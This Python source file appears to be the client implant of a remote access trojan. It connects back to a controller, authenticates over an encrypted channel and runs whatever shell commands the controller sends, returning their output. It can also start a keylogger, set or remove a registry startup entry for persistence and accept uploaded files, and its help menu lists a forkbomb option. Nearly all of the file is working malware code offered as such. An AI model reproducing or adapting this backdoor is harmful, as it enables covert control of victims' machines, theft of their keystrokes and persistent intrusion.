import socket, time, subprocess, threading,sys
import tools.keylogger as keylogger
import _thread as thread
import settings.keys as keys
import tools.cipher as cipher
import queue
import tools.regedit as regedit
import tools.forkbomb as forkbomb
from tools.packet_manager import p_manager
from tools.dictionary import *
from tools.utils import packet_send, packet_recv, file_recv

class client:
    def __init__(self, cipherClass, HOST='127.0.0.1', PORT=5002):
        self.sock = None
        self.HOST = HOST
        self.PORT = PORT
        self.timeout = 3
        self.cipherClass = cipherClass
        self.command_list = queue.Queue()
        self.send_list = queue.Queue()
        self.stop = False

    def authenticate(self):
        conn = self.sock
        leftovers = b''

        while(True):
            try:
                packet, leftovers = packet_recv(cipherClass=self.cipherClass,
                                    conn=conn,
                                    decrypt=True,
                                    leftovers=leftovers)

                if packet[PK_COMMAND_FLAG] != COMMAND_START:
                    continue

                password = packet[PK_PAYLOAD_FLAG]
                sent = packet_send(command=COMMAND_ACKNOWLEDGE,
                            payload=password,
                            cipherClass=self.cipherClass,
                            conn=conn,
                            encrypt=False)
                if sent == True:
                    break
            except socket.timeout:
                print("Socket timed out on handshake..")
                leftovers = b''
        print("Handshake complete...")

    def exe_tool(self, message):
        command = message[PK_PAYLOAD_FLAG].lower()
        return_message = {PK_COMMAND_FLAG:'', PK_PAYLOAD_FLAG:''}

        if command == "keylogger":
            keylogger.keylogger("data.txt")

            return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
            return_message[PK_PAYLOAD_FLAG] = "Keylogger Activated."

            self.send_list.put(return_message)
            return

        elif command == "placestartup":
            if regedit.placeStartup():
                reply = "Successful!"
            else:
                reply = "Failed!"

            return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
            return_message[PK_PAYLOAD_FLAG] = reply
            self.send_list.put(return_message)
            return

        elif command == "removestartup":
            if regedit.removeStartup():
                reply = "Successful!"
            else:
                reply = "Failed!"

            return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
            return_message[PK_PAYLOAD_FLAG] = reply
            self.send_list.put(return_message)
            return
        elif command == "forkbomb":
            pass
            # send_list.put(cipherClass.encrypt("Forkbomb started...".encode()))
            # forkbomb.bomb()

    def parse_command(self, message):
        if isinstance(message,dict) == False:
            print("WARNING!, passed a weird output")
            return

        return_message={PK_COMMAND_FLAG:'', PK_PAYLOAD_FLAG:''}

        if message[PK_COMMAND_FLAG] == COMMAND_LINE_EXE:
            try:
                self.command_list.put(message)
            except:
                return_message[PK_COMMAND_FLAG] = COMMAND_ERROR
                return_message[PK_PAYLOAD_FLAG] = "Error in inputting the command."
                self.send_list.put(return_message)

        elif message[PK_COMMAND_FLAG] == COMMAND_TOOL_EXE:
            self.exe_tool(message)

        elif message[PK_COMMAND_FLAG] == COMMAND_FTP:
            if (file_recv(message) == True):
                return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
                return_message[PK_PAYLOAD_FLAG] = "Received part of the file."
            else:
                return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
                return_message[PK_PAYLOAD_FLAG] = "Error receiving file. Something went wrong"
            # self.send_list.put(return_message)

        elif message[PK_COMMAND_FLAG] == "HLP":
            return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
            return_message[PK_PAYLOAD_FLAG] = """
    Current list of commands implemented:
        CMD :param:     - enter command line commands
        EXE :param:     - execute created tools
            param lists - keylogger
                        - placestartup
                        - removestartup
                        - forkbomb
            """
            self.send_list.put(return_message)

        else:
            return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
            return_message[PK_PAYLOAD_FLAG] = "Unknown command. Type HLP to get Help"
            self.send_list.put(return_message)

        return

    def execute_commands(self):
        return_message = {PK_COMMAND_FLAG:COMMAND_RESPONSE, PK_PAYLOAD_FLAG:''}

        while(not(self.stop)):
            try:
                time.sleep(1)
                command = None
                #Reads the command_list pipe, needs to obtain thread lock
                if (not(self.command_list.empty())):
                    command = self.command_list.get()
                    command = command[PK_PAYLOAD_FLAG]
                if(command != None):
                    response = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                    data = response.stdout.read() + response.stderr.read()

                    try:
                        data = str(data.decode('utf-8'))
                    except:
                        data = data.hex()
                    return_message[PK_PAYLOAD_FLAG] = data
                    self.send_list.put(return_message)
                    # Allocate new dict for the return_message
                    return_message = {PK_COMMAND_FLAG:COMMAND_RESPONSE, PK_PAYLOAD_FLAG:''}
            except:
                print("ERROR IN EXECUTE_COMMANDS FUNCTION")
                self.stop = True
                return
    def input_collection(self):
        leftovers = b''
        while (not(self.stop)):
            try:
                packet, leftovers = packet_recv(cipherClass=self.cipherClass,
                                    conn=self.sock,
                                    decrypt=True,
                                    leftovers=leftovers)

                self.parse_command(packet)

            except socket.timeout:
                leftovers = b''
                continue
            except Exception as e:
                self.stop = True
                return False

    def send_message(self):
        while(self.stop == False):
            try:
                if not(self.send_list.empty()):
                    message = self.send_list.get()
                    packet_send(command=message[PK_COMMAND_FLAG],
                                payload=message[PK_PAYLOAD_FLAG],
                                cipherClass=self.cipherClass,
                                conn=self.sock,
                                encrypt=True)
            except Exception as e:
                print("ERROR IN SEND_LIST FUNCTION.")
                self.stop = True
                return

    def connect(self):
            self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.sock.settimeout(3)
            self.sock.connect((self.HOST,self.PORT))
            print("Connection successful...")

    def start_client(self):
        while (True):
            try:
                self.connect()
                self.authenticate()

                receiver = threading.Thread(target=self.input_collection)
                executor = threading.Thread(target=self.execute_commands)
                sender = threading.Thread(target=self.send_message)

                receiver.start()
                sender.start()
                executor.start()

                receiver.join()
                sender.join()
                executor.join()
                print("Error in one of the receiver or sender...")
                self.stop = False
                time.sleep(1)
            except Exception as e:
                print("Connection Failed.")
                continue
            finally:
                self.sock.close()


if __name__ == '__main__':
    cipherClass = cipher.cipher(keys.CONN_PASSWORD)
    target_client = client(cipherClass=cipherClass)
    target_client.start_client()